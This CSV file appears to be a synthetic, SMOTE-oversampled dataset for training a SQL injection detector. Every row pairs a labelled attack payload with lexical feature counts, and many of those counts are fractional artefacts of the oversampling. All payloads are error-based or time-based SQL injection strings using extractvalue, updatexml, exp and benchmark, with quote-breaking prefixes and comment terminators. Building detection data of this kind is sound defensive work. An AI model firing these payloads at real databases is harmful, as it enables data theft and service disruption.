id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000011,attack,error,"1"" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and ""ymwb""  =  ""ymwb",nearest_attack_euclidean,R000241,0.22081565256557897,160.11053672683215,29.889463273167838,3.8590050738940933,47.44214690732865,35.0,56.778926546335676,20.889463273167838,0.296294576048582,0.21859981422984762,0.35463228470435854,0.13047332501721193,0.0,4.000000000000001,0.0,0.0,0.0,1.8894632731678387,0.0,10.0,0.0,0.0,5.0,1.8894632731678387,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000012,attack,error,"1%""   )    )     )   procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and    (    (     (  ""%""  =  """,nearest_attack_euclidean,R000229,0.14262420417538613,192.16708703211611,31.0,3.4517174238605444,52.0,24.0,87.33366962569289,28.833417406423223,0.2706563457156194,0.12491831340720895,0.4543926662400552,0.15003267463711642,0.0,4.000000000000001,0.0,0.0,0.0,1.0,0.0,17.833417406423223,1.9999999999999998,0.0,4.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000013,attack,error,"1%""   )    )     )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  ""%""  =  """,nearest_attack_euclidean,R000278,0.27903560410962364,187.37280996393255,28.0,3.4404980568593317,40.0,35.0,83.69824797114605,28.674561992786515,0.2135641157944695,0.1868686013201608,0.44655138836015296,0.1530158945252167,0.0,4.000000000000001,0.0,0.0,0.0,2.0,0.0,15.674561992786513,1.9999999999999998,0.0,5.0,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000014,attack,error,"1'   )    )    as namw where 1740  =  1740 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )  --",nearest_attack_euclidean,R000089,0.13019925851303443,179.86101842551477,29.92406789503432,3.7589518662835464,43.77220368510296,46.69627158013728,66.54440737020592,22.84813579006864,0.243389604482493,0.2596204915797661,0.36996104305058175,0.12702886088715915,1.0,1.1102230246251565e-16,2.0,0.0,0.0,2.0,0.0,11.92406789503432,0.0,0.0,5.924067895034319,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000015,attack,error,"1  )   where 8734  =  8734 procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",nearest_attack_euclidean,R000132,0.200058816627812,170.89234839936603,36.0,3.9192885515205775,55.756939359746404,31.0,65.00925247966188,19.126156559957735,0.32621056051685143,0.18154544634742903,0.380288569960877,0.11195542317484251,0.0,1.1102230246251565e-16,0.0,0.0,0.0,1.0,0.0,13.126156559957735,0.0,0.0,4.0,1.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000016,attack,error,"1%' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and '%'  =  '",nearest_attack_euclidean,R000298,0.0533934996843248,159.08820349059803,31.014700581766338,3.7888790627938786,52.11760465413071,24.0,60.0,22.970598836467325,0.3275819538210667,0.15086270692684,0.3771567673171,0.1443985719349933,4.0,1.1102230246251565e-16,0.0,0.0,0.0,1.0,0.0,12.0,1.970598836467323,0.0,4.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000017,attack,error,"1  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )  ",nearest_attack_euclidean,R000063,0.5443386874600551,143.0,24.655806195173952,3.5722988376305147,34.032581414478145,37.62322478069581,53.688387609652096,17.655806195173952,0.23799007982152548,0.26309947399087974,0.3754432699975671,0.12346717619002764,0.0,1.1102230246251565e-16,0.0,0.0,0.0,1.0,0.0,11.0,0.0,0.0,5.655806195173952,1.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000018,attack,error,"1""   )    )    procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and    (    (   ""nzhj"" like ""nzhj",nearest_attack_euclidean,R000135,0.5665987503805233,189.0117132235779,30.54215471764908,3.679748515179626,64.0,24.0,76.84309435298161,24.16861887059632,0.33997870322985835,0.12749201371119687,0.4048185094706994,0.1277107735882454,0.0,4.000000000000001,0.0,0.0,0.0,0.0,0.0,16.16861887059632,0.0,0.0,4.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000019,attack,error,"1"" where 4445  =  4445 procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )  --",nearest_attack_euclidean,R000232,0.5535562129588741,168.2225595256713,32.55548809486574,3.813303600281684,54.0,32.0,61.778047620537045,20.44451190513426,0.3210731270913038,0.1902655567948467,0.36714585829172375,0.12151545782212574,0.0,1.0,2.0,0.0,0.0,1.0,0.0,12.444511905134261,0.0,0.0,4.0,3.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000020,attack,error,"1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   ",nearest_attack_euclidean,R000066,0.7895862653212328,169.0730762203279,27.308974593224033,3.4491940109476578,42.382050813551935,32.0,72.38205081355194,22.308974593224033,0.2506448172183772,0.18928008316130704,0.4280948951821026,0.13198020443821318,1.0,1.1102230246251565e-16,0.0,0.0,1.0,1.0,0.0,14.0,0.0,0.0,4.308974593224032,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,1.0,0.0,0.6910254067759679,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.691025406775968
SMOTE_000021,attack,error,"1',  (  select   (  case when   (  6560  =  2813  )   then 1 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual  )  ",nearest_attack_euclidean,R000045,0.007115060400896074,141.0,30.0,3.604503471040543,56.0,12.0,59.0,14.0,0.3971631205673759,0.08510638297872342,0.41843971631205673,0.09929078014184398,1.0,1.1102230246251565e-16,0.0,1.0,0.0,1.0,0.0,10.0,0.0,0.0,1.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0000000000000002,1.0000000000000002,7.0
SMOTE_000022,attack,error,"1""   )    )     )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  ""dzse""  =  ""dzse",nearest_attack_euclidean,R000083,0.8752951655142849,194.39124534338382,28.173736030151456,3.4974490097214748,48.564981373535275,35.0,84.21750931323237,26.60875465661618,0.24980750344506486,0.18005039421045643,0.43325247032988246,0.13688963201459625,0.0,4.000000000000001,0.0,0.0,0.0,1.6087546566161812,0.0,16.0,0.0,0.0,5.0,1.6087546566161812,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000023,attack,error,"1'   )    )     )   procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and    (    (     (  'aqdj'  =  'aqdj",nearest_attack_euclidean,R000209,0.1351084831151757,199.0,31.604364820887444,3.5195016723156516,60.0,24.0,88.0,27.0,0.3015075376884422,0.12060301507537688,0.44221105527638194,0.135678391959799,4.0,1.1102230246251565e-16,0.0,0.0,0.0,1.0,0.0,18.0,0.0,0.0,4.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000024,attack,error,"1%""   )    )    procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and    (    (   ""%""  =  """,nearest_attack_euclidean,R000308,0.972111661339346,181.27053092445928,30.78381636555741,3.5755225083109465,53.72946907554071,24.0,77.40579638668892,26.13526546222964,0.29684387924284367,0.13244363022054573,0.42665474675432724,0.14405774378228334,0.0,4.000000000000001,0.0,0.0,0.0,1.0,0.0,15.56763273111482,1.5676327311148208,0.0,4.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000025,attack,error,"1' or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and 'esjl'  =  'esjl",nearest_attack_euclidean,R000264,0.12063496629773977,160.0,27.20600466377242,3.8264418832316713,44.20600466377242,38.72532711497011,55.13733644251494,21.93133177874253,0.2762875291485776,0.24203329446856317,0.3446083527657184,0.13707082361714082,4.0,1.1102230246251565e-16,0.0,0.0,0.0,2.0,0.0,10.0,0.0,0.0,5.9313317787425275,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000026,attack,error,"1"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""okpa""  =  ""okpa",nearest_attack_euclidean,R000069,1.094138892246642,165.77667620723454,28.95533524144691,3.8313137744177928,46.43300286217037,37.08932951710618,59.77667620723455,22.477667620723455,0.280075661308484,0.2242959456675002,0.36000609051494176,0.135622302509074,0.0,4.000000000000001,0.0,0.0,0.0,2.0,0.0,10.95533524144691,0.0,0.0,5.522332379276545,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000027,attack,error,"1"" or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and ""ekjs"" like ""ekjs",nearest_attack_euclidean,R000240,0.993718271034002,161.36188483669878,30.08565451009633,3.9540132065314832,48.36188483669878,39.0,53.0,21.0,0.29970450834088497,0.2416949042009335,0.32845717750383274,0.1301434099543488,0.0,4.000000000000001,0.0,0.0,0.0,1.0,0.0,10.0,0.0,0.0,6.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.3618848366987768,0.6381151633012232,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
